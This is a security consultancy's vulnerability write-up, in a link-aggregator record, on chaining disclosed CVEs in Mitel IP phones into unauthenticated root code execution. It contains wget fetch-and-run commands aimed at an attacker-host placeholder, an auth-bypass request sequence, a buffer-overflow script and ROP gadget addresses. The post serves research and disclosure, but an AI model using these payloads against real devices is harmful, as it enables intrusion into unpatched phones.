{"aid": "40165148", "title": "Exploiting embedded Mitel phones for unauthenticated RCE", "url": "https://baldur.dk/blog/embedded-mitel-exploitation.html", "domain": "baldur.dk", "votes": 1, "user": "snazz", "posted_at": "2024-04-26 01:57:30", "comments": 0, "source_title": "Baldur", "source_text": "Baldur\n\n'\n\n## Exploiting embedded mitel phones for unauthenticated remote code execution\n\nby Kevin Joensen on 25 Apr 2024 |\n\n|\n\n### Introduction\n\nThis post details the process of going from absolutely nothing to achieving a\nfully unauthenticated remote code execution exploit as root in a Mitel IP\nphone. We've discovered several zero-days which chained together gives the\nprivilege of completely owning the phone. This serves as a guideline on how\nyou can conduct research on embedded devices.\n\nAll vulnerabilities were subject to responsible disclosure and fixes are\navailable here: Mitel Security Advisories\n\nThe issues are tracked under these identifiers:\n\n  * CVE-2024-31963 (Mitel Advisory ID 24-0006)\n  * CVE-2024-31964 (Mitel Advisory ID 24-0007)\n  * CVE-2024-31965 (Mitel Advisory ID 24-0008)\n  * CVE-2024-31966 (Mitel Advisory ID 24-0009)\n  * CVE-2024-31967 (Mitel Advisory ID 24-0010)\n\nMitel was very responsive and mitigated all vulnerabilities found.\n\nThroughout this post we have obfuscated core parts of the exploit, so we prove\na point without releasing a working PoC.\n\nVideo PoC\n\n### Bug #1 - Getting a great debug environment\n\nWhen hunting for remote bugs in these appliances, a proper debug environment\nis needed. Furthermore, to find and exploit more complex issues we need to\nfind the firmware and what applications are running on the device. Getting GDB\non the device will also prove very useful when exploiting memory corruption\nbugs.\n\nThis can be achieved in many ways. The first thought was disassembling the\ndevice and utilize methods such as JTAG and UART to grab the firmware directly\noff the hardware, and maybe get a shell. However this quickly proved\ntroublesome, and we resulted to the next greatest thing - Finding a command\ninjection in the physical panel instead! This can give us a shell and a\nbasepoint for doing further discoveries, with a more clear sight of what is\ngoing on.\n\nMany hours of research went by when this command injection was suddenly\ndiscovered.\n\n  1. Go to admin settings\n  2. Go to Diagnostics -> Diagnostic Server\n  3. Enter a command injection as the url\n  4. Go to Diagnostics -> Capture\n  5. Click Start -> Stop -> Upload\n\nDuring the upload of the log, the command injection will trigger as root.\n\nTo test this we simply inject the command &telnetd;. The reason for this, is\nthat we can see from multiple internet resources that telnetd is available on\nthe device.\n\nWhen triggering the command injection we can now connect to the device over\ntelnet which was previously unavailable.\n\n    \n    \n    ggisz@computer:~/mitel$ telnet 192.168.1.100 Trying 192.168.1.100... Connected to 192.168.1.100. Escape character is '^]'. 6867i login: root Password:\n\nHowever as we don't have the root password for the phone, we need to reset the current password. This was a bit tricky to achieve as | characters are not available on the physical keyboard. Luckily ;./+ are all available which is what we need for fetching a payload with arbitrary contents through wget.\n\nSo our new command injection becomes the following\n\n    \n    \n    &telnetd;cd /tmp;wget <attackerip>/s.sh;chmod +x ./s.sh;./s.sh;rm s.sh;\n\nTo get the character / you press the 1 button 5 times. Yes, this payload takes\nforever to type out on the phone keyboard.\n\nThis allows us to write our payload remotely with no character limitations,\nand have the phone fetch it, run it and then delete it.\n\nInside s.sh we write the following contents:\n\n    \n    \n    sudo su printf \"sample\\nsample\\nsample\\n\" | passwd root\n\nThe s.sh is simply hosted by python -m http.server 80 on our attacker machine,\nwhich should be reachable by the phone. Here we can see the phone succesfully\ngetting the file b.sh\n\n    \n    \n    ggisz@computer:~/mitel$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 192.168.1.100 - - [21/Mar/2024 13:43:11] \"GET /b.sh HTTP/1.0\" 200 -\n\nThe payload simply changes our account to root incase we aren't already and\nthen it sets the root password to sample.\n\nNow we can login to the mitel phone through telnet with our updated password\n\n    \n    \n    Trying 192.168.1.100... Connected to 192.168.1.100. Escape character is '^]'. 6867i login: root Password: 192.168.1.100 # whoami root 192.168.1.100 # uname -a Linux 6867i 3.4.74 #1 PREEMPT Thu Dec 2 00:37:04 EST 2021 armv6l GNU/Linux 192.168.1.100 #\n\nWe have now completed the first steps of getting a good debug environment.\nThis vulnerability will not be used further, but is simply a platform upon\nwhich we stand to further our discoveries. This could've been a debug port\nover UART or similar, but we choose this way.\n\nFrom here, getting the firmware and reverse engineering is the next step. Now\nwe have full root access to the phone, and the actual exploit development can\nbegin!\n\n### Reverse engineering firmware\n\nDuring the initial recon, we noticed the panel on port 80 which is a http\nserver that allows configuring the phone.\n\nThis has a lot of different options and functionality and is a prime example\nof a good attack vector. However, everything is protected by basic\nauthentication, so no functionality is seemingly available to users not\nauthenticated.\n\nIf we utilize our root access to do some recon, we can see that the binary\nresponsible for the webserver is called linemgrSip and is running on port 80:\n\n    \n    \n    192.168.1.100 # netstat -lntp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 192.168.1.100:5060 0.0.0.0:* LISTEN 944/linemgrSip tcp 0 0 192.168.1.100:5061 0.0.0.0:* LISTEN 944/linemgrSip tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 944/linemgrSip tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN 944/linemgrSip tcp 0 0 :::49249 :::* LISTEN 1177/httpd tcp 0 0 :::23 :::* LISTEN 7659/telnetd\n\nSo the next thing to do is to download this binary from the device and start\nto reverse engineer the application locally. For this we typically use a mix\nof Ghidra or IDA.\n\nWhen looking for exploits that yield unauthenticated remote code execution, we\nsystematically reverse engineer interesting parts.\n\nThe typical flow is the following (In order):\n\n  1. Look for bugs in the unauthenticated parts of the application\n  2. Look for bugs in authenticated areas\n  3. Look for authentication bypasses to chain with step 2\n\nThis is done to maximize the potential of finding bugs with an impact.\n\nFirst we check which code can be reached unauthenticated. In this specific\ncase, we reverse engineered the whole routing table so we could map every\nrequest to a specific function. This enables dynamic analysis which can then\nbe pinpointed to the specific code entry.\n\nWhen looking at the code that decides which HTTP request goes to which code\nentry, we discovered that the POST handlers are not bound by the same\nauthentication function that the GET is. This simply means that POST requests\ncan be done unauthenticated.\n\nHowever there is one caveat. There is a session renewal check done on the\nrequest. In other terms this means that we can only send unauthenticated POST\nrequests, if some user already authenticated within the last 10 minutes. This\nis very problematic, as we then have to assume someone logs into the web panel\nand then conduct our attack. This is very unlikely and the window of\nexploitation is now very low.\n\nWhen looking at what code renews the session timing, we discovered that it was\nnot necessary for them to be authenticated. Just a valid route as a GET\nrequest and you're good to go. Luckily there are a couple of those that are\nallowed unauthenticated.\n\nThe following piece of code is commented for readability. Basically it does\nthe following:\n\n  1. Is .html anywhere in the path?\n  2. Is .xml anywhere in the path?\n  3. Is ScreenShotFile.png anyhere in the path? (extra vulnerability here, also reported and patched. Maybe you can spot it)\n\nIf any of these checks are true, then it will block our unauthenticated GET\nrequests.\n\nNote: This is for the GET handlers. POST handlers does not have this check,\nhowever it has the aforementioned session timing check\n\n    \n    \n    undefined4 checkFileEndings(char *path) { char *somearg; int iVar1; size_t __n; bool do_authentication; int local_18; if (*path == '\\0') { do_authentication = true } else { somearg = strstr(path,.htmlStr); if (((somearg == (char *)0x0) && (somearg = strstr(path,\".xml\"), somearg == (char *)0x0)) && (iVar1 = strcmp(path,\"ScreenShotFile.png\"), iVar1 != 0)) { do_authentication = false; } else { // Check if the *path is in the route table for (local_18 = 0; local_18 < 0x53; local_18 = local_18 + 1) { somearg = *(char **)(&DAT_01210da8 + local_18 * 8); __n = strlen(*(char **)(&DAT_01210da8 + local_18 * 8)); iVar1 = strncmp(path,somearg,__n); if (iVar1 == 0) { return *(undefined4 *)(&DAT_01210dac + local_18 * 8); } } do_authentication = false; } } return do_authentication; }\n\nThis leaves us with multiple routes available for session renewal. We picked\n/favicon.ico.\n\nSo our authentication bypass now consists of the following.\n\n  1. Make a GET request to http://<phone>/favicon.ico\n  2. Make a unauthenticated POST request to arbitrary endpoints\n\nThis is great as the whole array of authenticated POST methods are now\navailable. We can now look for vulnerabilities that can be chained together to\nachieve unauthenticated RCE.\n\n### Finding our RCE bug\n\nNow the hunt begins for authenticated bugs in a POST handler that will achieve\nremote code execution.\n\nBy looking through every route of the application we stumbled upon\n/sysinfo.html. Through the dynamic use of the application this seemingly only\nhad a GET handler. However, reverse engineering revealed a secret POST\nhandler.\n\nThis POST handler allowed to set the mac address of the device, through the\nmac parameter. It is interesting that we can set that value, but not that\nuseful. However what is useful is the buffer overflow vulnerability in this\ncode:\n\n    \n    \n    bool sysinfoPostHandler(param_1, param_2) { // Stack variables ...SNIP.... char *pcVar3; ...SNIP... char macParameter [20]; uVar2 = getParameter(param_2,\"mac\"); strcat(macParameter,uVar2); ...SNIP... strcpy(acStack_148,pcVar3); ...SNIP... free(macParameter); return !bVar1; }\n\nThis takes our parameter mac and uses strcat to put it into the stack variable\nmacParameter. This looks like a text book buffer overflow, but as always in\nthe real world, there are several obstacles.\n\nA quick look through checksec reveals that the binary is not protected by\nstack canaries which is great.\n\n    \n    \n    STACK CANARY No canary found\n\n#### Issue 1\n\nThe first problem is that the strcpy further down is overwriting the\nmacParameter, which makes the exploit break when we hit the free call. We need\nto pass a valid known address to free\n\n#### Issue 2\n\nThe second problem is that addresses are in this range 0x00ffffff for the\napplication code. This makes us unable to use stack variables or a large rop\nchain. This happens due to the fact that when our input is read as the buffer\noverflow is, it goes through strcat and strcpy. Both of these has terminations\non null bytes. So our payload has to be free from nullbytes. ROP chains from\nlibraries is also partly out of the question as they are not loaded at\npredictable addresses. Again, a caveat here is that library\n/lib/libstdc++.so.6 seemingly does not move around. libc does, which is the\nusual goto.\n\n    \n    \n    0x4fd28000 0x4fded000 0x000c5000 r-x /lib/libstdc++.so.6\n\nSo to exploit this issue we need to meet the following two criterias:\n\n  1. Write a valid address that overwrites macParameter which can be freed and does not contain null bytes\n  2. Write a ROP gadget without nullbytes that gives us RCE.\n\nSince the binary address space contains nullbytes, we can't use that for the\nfull chain. However, our chain is able to end on a address in the binary using\na partial overwrite. It just has to be in the end.\n\nI.e the address 0x00414243 with our ROP gadget will be written as\n\\x43\\x42\\x41\\x00. So if this is just the last piece of our payload we can do\nit.\n\nAfter staring hard at GHIDRA and GDB for an extended amount of time, we came\nacross the EXTERNAL segment. This has the following properties:\n\n  1. Static known address\n  2. No null bytes\n  3. Is malloc'ed (i.e we can call free on it without problems)\n\nSo with this address, we can now get by the free call without any segmentation\nfaults!\n\nLet's just test this on the phone to ensure that we can overwrite PC (ARM\nequivalent of EIP)\n\nNormally we'd have to find a version of gdbserver and ship it to the phone,\nbut in this case it is already present on the phone, under /usr/bin/gdbserver.\n\nHowever, gdbserver was a bit problematic and old, so we went to google and\nended up with this version Cross-compiled gdbserver binaries\n\nBeing clever from the damage from the previous phone that we bricked which now\ncannot be booted as it is trying to set the macaddress to be\n0x414141414141414141, we setup a repair script first. Basically on boot,\nalways repair the macaddress to a valid value.\n\nFor the repair script we use this script which runs after the network\ninitialization. The following contents in the top will repair everything.\n\n/etc/init.d/atlasSip\n\n    \n    \n    /etc/init.d/atlasSip ifconfig eth0 hw ether 00:08:5D:A4:EC:0C telnetd\n\nSo now the MAC address is forced, and telnetd is automatically started. No\nmore expensive bricked phones \ud83e\udd79\n\nNow we can send the first part of the exploit and test away.\n\nOn phone: gdbserver :9999 --attach 944 (944 is PID of linemgrSip)\n\nOn attacker: (This assumes you've have downloaded linemgrSip locally)\n\nPersonally I use gef for enhanced output, but standard will also do.\n\n(Yes I used peda here, but it broke, so gef was my goto.)\n\n    \n    \n    ggisz@computer:~/$ gdb-multiarch gdb-peda$ target remote 192.168.1.100:9999 gdb-peda$ file linemgrSip_version_154 Reading symbols from linemgrSip_version_154... ...SNIP...\n\nThe reason for gdb-multiarch is that your attacker machine is probably x86,\nand the phone is ARM\n\nThe file command will load all the binary information to our gdb instance.\nSome gdbserver supports this over the network, but this specific version does\nnot. If you downloaded the gdbserver mentioned earlier then this will happen\nautomatically.\n\nWe're now in business for debugging:\n\nSo now we gather our solutions to our initial exploit that overwrites PC(EIP\non arm) and proves that the return address is controlled.\n\n    \n    \n    from pwn import * import requests from urllib3.exceptions import InsecureRequestWarning host = \"https://192.168.1.101\" # Suppress the warnings from urllib3 requests.packages.urllib3.disable_warnings( category=InsecureRequestWarning ) # Auth bypass request print(\"[*] Sending auth bypass request\") r = requests.get(f\"{host}/favicon.ico\", verify=False) payload = b\"\" payload += cyclic(300) # 300 junk padding payload += p32(0x015b8008) # PTR in EXTERNAL segment that allows being freed payload += cyclic(20) # padding payload += p32(0x41424344) # Overwrite PC (EIP on arm) data = { \"mac\": payload } print(\"[*] Sending exploit payload\") try: r = requests.post( \"https://192.168.1.101/sysinfo.html\", data=data, verify=False, ) except: print(\"[!] Payload crashed the phone\")\n\nIt works! We have PC(EIP) control.\n\nLuckily the binary reboots after crashing which means you can test as much as\nyou want. (However phone reboot might brick if you don't repair mac.)\n\nNow that we solved issue 1, we need to solve issue 2. Our ROP chain to give us\nroot.\n\nSo normally you gain a reverse shell or try to see if you can write some\nshellcode. We wanted to see if we could hit a system call with r0 pointing to\nour command.\n\nThis would give us the full possibility of running arbitrary commands on the\ndevice.\n\nAgain, staring at GHIDRA revealed a gadget that was really useful.\n\n    \n    \n    0001612c ff fc ff eb bl <EXTERNAL>::system int system(char * __command)\n\nNow since r0 is used as the first argument on ARM architecture, we simply need\na ROP chain earlier in our chain which sets the r0 to somewhere we control the\ncontents of.\n\nOur idea was to write the full command on the stack as we have plenty of space\nin the payload. Then get the address of the stack into r0 and then call\nsystem.\n\nAfter looking at gadgets in /lib/libstdc++.so.6 we came across these 3.\n\nGadget 1\n\nThe important bits here is that it migrates sp+8 into r0. Then a whole lot of\nthings are happening but it loads the pc with the value from sp.\n\nSo after this we have sp+8 in our r0. Almost there.\n\n    \n    \n    0x4fd82130 add r0, sp, #8 ; cmp r3, r2 ; movge r3, #0 ; movlt r3, #1 ; strb r3, [r0, #-1]! ; bl #0x4fd82024 ; add sp, sp, #0xc ; ldm sp!, {pc}\n\nGadget 2\n\nr0 is pointing at our ropchain. We want it to point at the command we're\ninjecting. This neat gadget will fix that for us and return again to gadget 3.\n\n    \n    \n    0x4fdd3520 : add r0, r0, #0x20 ; pop {r4, pc}\n\nGadget 3\n\nr0 is now fixed. But the 3 step in our ropchain cannot be our system call.\nRemember our nullbyte issue? We have to place the system gadget with the null\nbyte at the end of our buffer input (macParameter)\n\nSo we use this gadget to migrate further down to the end of our input on the\nstack.\n\n    \n    \n    0x4fda08c4 : add sp, sp, #0x2c ; pop {r4, r5, r6, r7, r8, sl, pc}\n\nNow with these 3 gadgets we can place 0x1612c which contain a nullbyte at the\nend of our input buffer.\n\nSo now we have a 100% reliable exploit. Let's debug it and see what happens:\n\n    \n    \n    $r0 : 0xadb7ac27 \u2192 \"/bin/touch /arbitrary command # aaaabaaacaaaaaabaaacaaadaaae[...]\" --SNIP-- \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500 0xadb7ac60\u2502+0x0000: 0x00000000 \u2190 $sp 0xadb7ac64\u2502+0x0004: 0x00000020 (\" \"?) 0xadb7ac68\u2502+0x0008: 0x00000010 0xadb7ac6c\u2502+0x000c: 0x0057704c \u2192 push {r11, lr} 0xadb7ac70\u2502+0x0010: 0xadb7ac8c \u2192 0x00577110 \u2192 push {r11, lr} 0xadb7ac74\u2502+0x0014: 0x00000000 0xadb7ac78\u2502+0x0018: 0x00000001 0xadb7ac7c\u2502+0x001c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:arm:ARM \u2500\u2500\u2500\u2500 0x16120 bl 0x152b4 <memcpy@plt> 0x16124 sub r3, r11, #456 ; 0x1c8 0x16128 mov r0, r3 \u2192 0x1612c bl 0x15530 <system@plt> \u21b3 0x15530 <system@plt+0000> add r12, pc, #17825792 ; 0x1100000 0x15534 <system@plt+0004> add r12, r12, #892928 ; 0xda000 0x15538 <system@plt+0008> ldr pc, [r12, #556]! ; 0x22c 0x1553c <std::basic_stringstream<char, std::char_traits<char>, std::allocat\n\nIt works! system is being called with /bin/touch /arbitrary command. A minor\ndetail here is that it runs until the nullbyte. This includes our last gadget\nwhich calls the system as that is further down the stack. However this really\nisen't an issue as we terminate it with #.\n\nNow we achieved 100% reliable unauthenticated remote root exploit!\n\n### Crafting the exploit payload\n\nSince we're blessed with a physical device, a calc.exe won't do it. However\ndrawing on the screen and blasting imperial march from starwars out the\nspeaker will definitely do the trick! (And maybe a little calc)\n\nEmbedded devices often uses framebuffers. These can usually be found in\n/dev/fb0. These can simply be written to by cat'ing a valid image in there.\n\nFirst we need to get the specs of the screen which can be found by using\ndmesg:\n\n    \n    \n    192.168.1.100 # dmesg | grep -i frame BCMRING_PRAXIS_3_bootmemheap_calc_fb_mem: Reserving memory for frame buffer w:320 h:240 bpp:2 x 2 (614400 bytes) LcdHeapSize: framebuffer rounded up to page size = 614400 = 0x96000 bytes\n\nHere we can see that the screen is rgba and the size is 320x240. Now we simply\ninstall imagemagick and then we can convert all our cool PNG's to be\ncompatible with the screen:\n\n    \n    \n    sudo apt install graphicsmagick-imagemagick-compat convert input.png -depth 8 rgba:output_image.rgb\n\nSending output_image.rgb to the phone and running this command will display\nit:\n\ncat /path/to/output_image.rgb > /dev/fb0\n\nSecond part is playing music. For this we found a tool already on the device\ncalled pxcon. This can take a .wav file and play it on the device through any\nof the speakers it has.\n\n    \n    \n    192.168.1.100 # pxcon > write 1 0 /etc/pathtowav.wav\n\nThe .wav file needs to be 16 bits little endian to play.\n\nUse this ffmpeg command to convert your favorite songs to be a part of your\nexploit:\n\nffmpeg -i input.mp3 -acodec pcm_s16le -ar 16000 -ac 1 output.wav\n\nSo our final exploit looks like this:\n\n  1. Trigger session renewal\n  2. Use POST auth bypass\n  3. Trigger buffer overflow\n  4. Use EXTERNAL segment to bypass free call\n  5. Use our ROP chain to set the correct registers\n  6. Call system with our payload\n  7. Payload will download an image and a song and play it on the device\n\nThe final call that goes into system is the following: wget\n<attacker>/p.sh;chmod +x ./p.sh;./p.sh;rm p.sh.\n\nNote: The volume might be a bit loud\n\nBALDUR.\n\nResearch driven offensive security consultancy to ensure maximum security for\nyour enterprise. We thrive on technical challenges and breaking applications\nto help making them secure.\n\n### Pages\n\n  * About us\n  * Services\n  * Careers\n  * Contact us\n\n### Contact\n\n  * Copenhagen\n  * Denmark\n  * info@baldur.dk\n\n### Newsletter\n\nCopyright Baldur \u00a9 2024. All Rights Reserved.\n\n", "frontpage": false}
